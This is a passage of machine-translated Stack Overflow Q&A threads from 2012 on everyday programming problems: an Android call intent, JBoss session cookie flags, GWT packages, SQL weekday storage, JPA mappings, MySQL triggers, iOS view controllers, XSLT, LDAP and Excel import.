    Object o = this.getListAdapter().getItem(position);
    String pilihan = o.toString();

    callRumahsakit(pilihan);
    // try {
    // Intent intent = new Intent(Intent.ACTION_CALL);
    // intent.setData(Uri.parse("telp:" + o.));
    // startActivity(intent);
    // } catch (Exception e) {
    // e.printStackTrace();
    //
    // }
}

private void callRumahsakit(String pilihan) {
    try {

        Contact cn = new Contact();
        String phone_number = "";

        for (int i = 0; i < dataTempat.length; i++) {
            if (pilihan.equals(dataTempat[i])) {
                phone_number = cn.getPhoneNumber();

            }
        }
        if (phone_number.equals("")) {
            Toast.makeText(this, "Rumah Sakit tidak terdaftar",
                    Toast.LENGTH_LONG).show();

            return;
        } else {

            Toast.makeText(this, phone_number, Toast.LENGTH_LONG).show();

            Intent callIntent = new Intent(Intent.ACTION_CALL,
                    Uri.parse("tel:" + phone_number));
            // callIntent.setData(Uri.parse("tel:" + phone_number));

            startActivity(callIntent);
        }
    } catch (Exception e) {
        e.printStackTrace();
        // TODO: handle exception
    }
} 
```

}

# jakarta-ee - jboss7中缺少HTTP唯一属性设置吗？

> ID：13599957
> 
> 赞同：4
> 
> 时间：2012-11-28T07:28:57.830
> 
> 标签：jakarta-ee, servlets, session-cookies, jboss7.x, cookie-httponly

我对 JBOSS5 和 6 使用了以下步骤，但这些步骤不适用于 JBOSS 7：

```
 - change server/CONFIG/deploy/jbossweb.sar/context.xml
  - add <SessionCookie httpOnly="true" secure="true"> 
```

当我找到 jboss7 的解决方案时，将 http-only 标记添加到 web.xml 中的会话配置

```
<session-config>
    <cookie-config>
        <http-only>true</http-only>
        <secure>true</secure>
    </cookie-config>
    <tracking-mode>COOKIE</tracking-mode>
</session-config> 
```

所以据我了解，这是关于应用程序级别 web.xml 的配置 那么我们如何为整个 JBOSS 实例设置 cookie 保护呢？允许在 JBOSS56 中全局配置会话 cookie 是个好主意，JBOSS7 中是否缺少此功能？这个问题可能会在 StackOverflow 中重复出现。但我无法在这些答案中获得适当的清晰度。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-16T23:31:07.203

无需将其配置为某些属性配置文件的一部分。此配置现在是 servlet 规范的一部分，这意味着它可以配置为 web.xml 的一部分

```
 <session-config>
        <cookie-config>
           <http-only>true</http-only>
        </cookie-config>
      </session-config> 
```

只要确保您使用 3.0 xsd 版本的 web.xml

# java - 如何在 gwt 中组织包？

> ID：13599965
> 
> 赞同：0
> 
> 时间：2012-11-28T07:29:41.160
> 
> 标签：java, gwt

一个 GWT 项目有客户端、服务器和共享三个包？谁能说出每个包中组织了哪些所有类？共享包的需求是什么？我是 GWT 的初学者。谁能帮我？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T07:42:58.503

首先，看一下关于项目布局[的 GWT 解释。](https://developers.google.com/web-toolkit/doc/latest/DevGuideOrganizingProjects)

简而言之：`client`包及其子包包含将编译为 JavaScript 并在客户端执行的类。对于这些课程，适用某些[限制](https://developers.google.com/web-toolkit/doc/latest/DevGuideCodingBasicsCompatibility)。

该`server`包包含在服务器端执行的代码。对于`shared`包：您不一定需要它，但将通过[GWT 的客户端-服务器-通信机制](https://developers.google.com/web-toolkit/doc/latest/DevGuideServerCommunication)从客户端传输到服务器的类放在那里可能是有意义的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T07:56:01.510

我建议通过以下教程并使用 MVP 模式，它解决了很多关于如何组织项目的问题： [mvp 模式](https://developers.google.com/web-toolkit/articles/mvp-architecture)

要清除您的问题：

*   客户端：每个代码都将被编译成 JavaScript 并在客户端上运行
*   服务器：代码不会编译成 JavaScript 并在服务器上运行
*   共享：代码可以在客户端或服务器上运行。代码将被编译成 JavaScript。

您不需要共享包，您可以将所有客户端类打包在客户端包中，但如果您有双方都使用的类，则更好理解。

# sql - 在数据库中存储星期几

> ID：13599969
> 
> 赞同：6
> 
> 时间：2012-11-28T07:29:50.820
> 
> 标签：sql, sql-server, database, asp.net-mvc-3

我必须为学校做一个小项目。在数据库表中存储星期几的最佳可能性是什么？

例如，一周中的几天进行数据备份——我应该使用这样的列：

```
backupDays varchar(50)
1,5       >> monday + friday
2,3,4     >>tuesday + wednesday + thursday 
```

我必须在我的 asp.net MVC 程序中使用这个表，并且我使用 MSSQL 数据库。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-28T09:17:39.757

在这种情况下（一个字段中有 7 个布尔值），我们得到一个只有 7 位长的二进制集。[因此，您可以在 MS SQL- tinyint](http://msdn.microsoft.com/en-us/library/ms187745.aspx)中使用一种字节长度字段类型。并使用 [按位运算符](http://msdn.microsoft.com/en-us/library/ms174965.aspx)来操作它。

例如（二进制）：

00000001 - 星期日

00000011 - 周一和周日

00000101 - 周二和周日

00000111 - 周一、周二和周日

在这里您可以找到详细信息和示例：

[http://sqlfool.com/2009/02/bitwise-operations/](http://sqlfool.com/2009/02/bitwise-operations/)

[http://www.mssqltips.com/...](http://www.mssqltips.com/sqlservertip/1218/sql-server-bitwise-operators-store-multiple-values-in-one-column/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:56:29.820

在我看来，将一周中的**某**一天存储在字段中的最佳方法是将其存储为数字 (0..6)。但似乎你想在一个字段中存储超过一天。显然，您不能在单个字段中存储多个值。您需要使用单独的表：

```
create table Course
(
  CourseId int not null primary key,
  Name nvarchar(100) not null
);

create table CourseDayOfWeek
(
  CourseDayOfWeek int not null primary key,
  CourseId int not null references Course (CourseId),
  Day int not null
); 
```

但是如果你真的需要在一个字段中存储多个值（你不能创建一个新表），你可以使用 xml 字段或字符串字段。然后您需要手动解析该字段。

# jpa - 如何在 JPA 实体中设计多对多关系？

> ID：13599971
> 
> 赞同：2
> 
> 时间：2012-11-28T07:30:05.513
> 
> 标签：jpa

我试图了解设计 2 个具有多对多关系的实体的更好方法是什么？在数据库中，这两个实体之间将有一个连接表。但是我在创建实体时是否必须遵循相同的方法？

例如：用户到用户组

一个用户可能属于多个组，一个组可能包含多个用户。

在关系数据库中，我将有 3 个表，如 User、User2Group、Group

因此，当我创建我的 JPA 实体时，我应该为 3 个表提供 3 个实体，还是通过提供适当的注释（@ManytoMany）只提供 2 个实体。

由于我是 JPA 的新手，我试图从以下角度理解好的和坏的一面：

1.  表现
2.  代码维护

谢谢，您的输入将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-28T08:05:19.293

不，您不需要将连接表映射为实体。只需使用 ManyToMany 注释：

```
public class User {
    ...
    @ManyToMany
    private Set<Group> groups;
}

public class Group {
    ...
    @ManyToMany(mappedBy = "groups")
    private Set<User> users;
} 
```

如果连接表不是纯连接表，即如果它具有附加信息，例如，用户进入组的日期，您只需将连接表映射为实体。

映射对性能的影响很小。重要的是您如何使用和查询实体，以及如何设计数据库（索引等）

# mysql - mySQL 触发器 PRINT & ROLLBACK

> ID：13599972
> 
> 赞同：0
> 
> 时间：2012-11-28T07:30:13.210
> 
> 标签：mysql, triggers

```
DELIMITER $$
CREATE TRIGGER insertTrigger BEFORE INSERT ON `agents` 
FOR EACH ROW
BEGIN
    DECLARE groupID int;
    SET groupID = 0;
    SET groupID = (SELECT id FROM `groups` WHERE `id` = NEW.group_id);

    IF (groupID != 0) THEN
        PRINT 'ID is ' + groupID;
        ROLLBACK;
    END IF;

END$$
DELIMITER ; 
```

创建上述触发器是为了检查组表中是否存在外键 ID。

1) 如何在 mySQL 中打印错误消息？

2) ROLLBACK 功能不起作用。它给了我以下错误信息。“#1422 - 存储函数或触发器中不允许显式或隐式提交。”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:35:50.403

您可以使用[SIGNAL](http://dev.mysql.com/doc/refman/5.5/en/signal.html)语句来引发来自触发器的自定义消息的错误。

```
...
IF (groupID != 0) THEN
  SET @msg = CONCAT('ID is ', groupID);
  SIGNAL SQLSTATE '02000' SET MESSAGE_TEXT = @msg;
END IF;
... 
```

如果您只需要警告消息，请使用以 '01...' 开头的 SQLSTATE 代码。

# ios - 如何将子视图添加到另一个视图控制器？

> ID：13599976
> 
> 赞同：1
> 
> 时间：2012-11-28T07:30:17.157
> 
> 标签：ios, uiviewcontroller, popover, addsubview

我正在做一个 Ipad 应用程序。现在我有 2 个 viewcontroller，ViewController 有一个 button1，它有一个 popover segue 到第二个 viewcontroller（PopoverController）。然后，PopoverController 有一个 button2，如果我单击 button2，我会从我的服务器收到一些 UIImage。如果单击 button2，我想将 UIImageView 的几个子视图添加到 ViewController 以显示这些图像。

button1 效果很好，PopoverController 可以按预期弹出。但是当我点击button2时，什么也没发生。我想知道如何在 2 个视图控制器之间传递数据以及如何将子视图添加到另一个视图控制器。

一些与我的问题有关的代码：

视图控制器.h：

```
#import <UIKit/UIKit.h>

@class PopoverController;

@interface ViewController : UIViewController
@property (strong, nonatomic) IBOutlet UIButton *button1;
@property (strong, nonatomic) PopoverController *popoverController;

@end 
```

弹出控制器.h：

```
#import <UIKit/UIKit.h>

@class ViewController;

@interface PopoverController : UIViewController
@property (strong, nonatomic) IBOutlet UIButton *button2;
@property (strong, nonatomic) UIImage *tempImg;
@property (strong, nonatomic) ViewController *viewController;

- (IBAction)addsubviews:(id)sender;

@end 
```

我不能只`[viewController.view addSubview:img1];`在`- (IBAction)addsubviews:(id)sender;`方法中使用 addsubview。所以有人可以帮助我吗？:)

====第一次更新====

有人建议我必须使用`- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender`方法。我已经通过控制单击 button2 并在 button2 和 ViewController 之间创建自定义 segue 来尝试这个。当我单击button2时，它显示： `Terminating app due to uncaught exception 'NSGenericException', reason: 'Could not find a navigation controller for segue 'change'. Push segues can only be used when the source controller is managed by an instance of UINavigationController.'`

所以我想知道我是否应该添加一个`NavigationController`. 如果是这样，我该怎么办？

====第二次更新====

我现在使用 Paramasivan 的代码，我找到了从另一个视图控制器调用方法的方法。现在的问题是我的视图控制器中新添加的子视图没有显示出来。我想我必须更新我的视图控制器才能使其可见。

在我`- (IBAction)addsubviews:(id)sender;`的方法中，我调用 ViewController 中的方法`[self.viewController createSubViewWithImage:_tempImg];`

所以当我点击button2时可以调用该方法，但是viewcontroller的视图没有任何改变。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:36:31.890

查看[Communicating with Objects](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/CocoaFundamentals/CommunicatingWithObjects/CommunicateWithObjects.html)文档，有几种方法可以做你想做的事。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:39:27.823

在 ViewController.h 添加以下内容

```
-(void)createSubViewWithImage:(UIImage *)imageDownloaded {
    UIImageView *imageViewTemp = [[UIImageView alloc] initWithImage:imageDownloaded];
    [self.view addSubView:imageViewTemp];
} 
```

在 PopoverController.h 添加以下内容

```
@property (nonatomic, retain) ViewController *viewControllerPassed; 
```

图像下载后，在 PopoverController.h 中调用以下命令

```
[viewControllerPassed createSubViewWithImage:imageDownloaded]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-30T00:44:35.507

添加这个`- (void)viewDidLoad`，

```
self.popoverController = [[PopoverController alloc] init]; 
self.popoverController.viewController = self; 
```

确保您在其他地方没有设置`self.popoverController = ...`.

不要在***课堂***上添加任何东西。你也不必这样做。如果您已经拥有它，只需删除这些行。`self.viewController = ...``popovercontroller``self.viewController.popoverController = self;`

完成这些后，请确保您`self.popoverController`仅在弹出窗口中显示，并且没有为那里的类创建新对象`popoverController`。因此，如果这些都很好，您可以使用任何您想要的方法将图像从`popoverController`一个类传递到`viewController`另一个类。

正如您在评论中提到的，您可以`[self.viewController createSubViewWithImage:_tempImg];`在`popovercontroller`课堂上使用。

**更新：** 如果你是通过故事板做的，你需要在`prepareForSegue`方法中设置它，你根本不需要创建`self.popoverController`。在您的情况下删除该部分。您可以按照此处提到的过程设置自定义 segue 并实现`prepareForSegue`传递对象的方法。资料来源：[故事板、视图和传递数据](https://stackoverflow.com/questions/7855888/on-storyboards-views-and-passing-data-along)

1.  将故事板中的 segue 名称设置为“CustomSegue”
2.  实现`prepareForSegue`方法
3.  在方法内部，检查 segue 的名称是否与“CustomSegue”匹配，然后将对象`viewController`中的设置为，`popoverController`

尝试，

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
    if ([segue.identifier isEqualToString:@"CustomSegue"]) {
        PopoverController *popoverController = [segue destinationViewController];
        popoverController.viewController = self;
    }
} 
```

完成此操作后，您需要打电话给`[self.viewController createSubViewWithImage:_tempImg];`您的`popoverController`班级。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T07:34:26.767

您可以使用以下方法传递数据：

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
 {
    if ([segue.identifier isEqualToString:@"ViewController2"])
    {
        ViewController2 *v2VC = [segue destinationViewController];
        v2VC.yourData = self.someStuff;
    }
 } 
```

# xslt-2.0 - XSLT 用多个标签包装文本

> ID：13599978
> 
> 赞同：0
> 
> 时间：2012-11-28T07:30:23.247
> 
> 标签：xslt-2.0

我有这个跨度元素与一类`autbib-pc-bold-italic`

```
<span class="autbib-pc-bold-italic">autbib</span> 
```

我想基于 @class 属性值创建元素标签：

**我的输出应该是：**

```
<autbib><pc><bold><italic>autbib</italic></bold></pc></autbib> 
```

这是我的 xsl 模板：

```
<xsl:template match="span[contains(@class,'autbib')]">
    <xsl:call-template name="pbib.loop">
        <xsl:with-param name="count" select="count(tokenize(@class, '-'))"/>
        <xsl:with-param name="class" select="tokenize(@class, '-')"/>
    </xsl:call-template>
</xsl:template>

<xsl:template name="pbib.loop">
    <xsl:param name="index" select="1" />
    <xsl:param name="count" select="count(tokenize(@class, '-')) + 1"/>
    <xsl:param name="class" select="tokenize(@class, '-')"/>
    <xsl:element name="{$class[1]}">
       <xsl:if test="not($index = $count)">
            <xsl:element name="{$class[$index]}">
                <xsl:apply-templates/>
            </xsl:element>
       </xsl:if>
    </xsl:element>

    <xsl:if test="not($index = $count)">
        <xsl:call-template name="pbib.loop">
            <xsl:with-param name="index" select="$index + 1" />
        </xsl:call-template>
    </xsl:if>
</xsl:template> 
```

并且有这个错误的输出：

```
<autbib>
    <pc>autbib</pc>
    <bold>autbib</bold>
    <italic>autbib</italic>
</autbib> 
```

**我需要有这个输出：**

```
<autbib>
    <pc>
        <bold>
            <italic>autbib</italic>
        </bold>
    </pc>
</autbib> 
```

我的问题是我不确定应该放置在哪里，`xsl:apply-template`以便标签相互包裹。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T12:52:04.490

这是我的建议：

```
<xsl:stylesheet 
  version="2.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:xs="http://www.w3.org/2001/XMLSchema"
  exclude-result-prefixes="xs">

<xsl:output indent="yes"/>

<xsl:template match="span[contains(@class,'autbib')]">
  <xsl:param name="classes" select="tokenize(@class, '-')"/>
  <xsl:choose>
    <xsl:when test="not($classes[1])">
      <xsl:apply-templates/>
    </xsl:when>
    <xsl:otherwise>
      <xsl:element name="{$classes[1]}">
        <xsl:apply-templates select=".">
          <xsl:with-param name="classes" select="$classes[position() gt 1]"/>
        </xsl:apply-templates>
      </xsl:element>
    </xsl:otherwise>
  </xsl:choose>
</xsl:template>

</xsl:stylesheet> 
```

使用 Saxon 9.4 转换输入

```
<span class="autbib-pc-bold-italic">autbib</span> 
```

进入结果

```
<autbib>
   <pc>
      <bold>
         <italic>autbib</italic>
      </bold>
   </pc>
</autbib> 
```

# c++ - LDAP 函数中是否有任何函数可以在不使用 ldap_search 的情况下获取用户信息？

> ID：13599981
> 
> 赞同：0
> 
> 时间：2012-11-28T07:30:27.453
> 
> 标签：c++, windows, active-directory, ldap

我想知道 AD 的用户详细信息。

我已经尝试过该`ldap_search`功能。

在 LDAP 功能中是否还有其他用于获取用户信息的功能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T13:43:55.497

该[`ldap_search`](http://msdn.microsoft.com/en-us/library/windows/desktop/aa366969%28v=vs.85%29.aspx)函数是 Windows 低级 LDAP 库的一部分。您可能想要更容易使用的 COM 接口[IAD 和朋友](http://msdn.microsoft.com/en-us/library/windows/desktop/aa772357%28v=vs.85%29.aspx)。

# excel - 读取 1GB 大小的 excel，每张 1.5 条记录到数据集

> ID：13599984
> 
> 赞同：2
> 
> 时间：2012-11-28T07:30:40.627
> 
> 标签：excel, vsto, openxml, office-interop

我正在尝试使用 .NET 应用程序将大型 excel 文件导入数据库，我将在其中对数据进行一些自定义清理和处理。excel 文件将包含 255 列和 150,000 行的工作表。我尝试了不同的解决方案，例如*Microsoft.JET/ACE provider*、*OpenXML/OfficeOpenXML*和*LinqToExcel*。`OutofMemory`Microsoft 适配器和 openxml 都出现异常。请让我知道如何处理它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T08:52:38.940

您是否尝试过 Integration Services 将 Excel 文件导入 SQL Server 2005？您可以使用 Integration Services（一个很棒的工具）来提取、转换和加载数据。集成服务的常见用途包括：将数据加载到数据库中；将数据进出关系数据库结构。

您可以一次又一次地从您的 .net 代码调用此服务，以重复执行任务。如果不是来自 .net 代码，您也可以安排它。

请参阅此[http://www.techrepublic.com/blog/datacenter/how-to-import-an-excel-file-into-sql-server-2005-using-integration-services/205](http://www.techrepublic.com/blog/datacenter/how-to-import-an-excel-file-into-sql-server-2005-using-integration-services/205)示例应用程序。

如果您不想使用 SSIS。您可以使用以下准备使用的开放工具进行相同的操作。

*   [http://exceldatareader.codeplex.com/](http://exceldatareader.codeplex.com/)
*   [http://www.codeproject.com/Articles/14639/Fast-Excel-file-reader-with-basic-functionality](http://www.codeproject.com/Articles/14639/Fast-Excel-file-reader-with-basic-functionality)
*   [http://www.codeproject.com/Articles/16210/Excel-Reader](http://www.codeproject.com/Articles/16210/Excel-Reader)

这应该可以帮助你。